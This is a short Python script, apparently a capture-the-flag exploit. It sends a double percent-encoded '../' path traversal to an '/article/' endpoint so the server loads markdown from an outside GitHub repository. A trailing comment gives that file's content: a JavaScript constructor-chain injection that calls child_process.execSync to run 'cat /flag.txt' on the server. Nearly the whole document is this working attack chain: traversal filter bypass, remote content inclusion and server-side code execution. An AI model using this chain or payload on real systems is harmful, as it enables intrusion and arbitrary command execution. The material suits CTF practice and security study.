import httpx

URL = "http://localhost"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)

    def article(s, path):
        return s.c.get("/article/"+path)

class API(BaseAPI):
    ...

def encode_to_hex(input_string):
    result = ""
    for char in input_string:
        if char in ['.', '%']:
            result += "%"+hex(ord(char))[2:]
        else:
            result += char
    return result
if __name__ == "__main__":
    api = API()
    res = api.article((encode_to_hex(encode_to_hex("../../../")))+"dimasma0305/TestingRepo/main/testing3.md")
    print(res.url)
    print(res.text)
# isi repo:
# ``<img src='```'>{''.constructor.constructor('return process.mainModule.require(`child_process`).execSync(`cat /flag.txt`).toString()')()}</img><img src='```'></img>
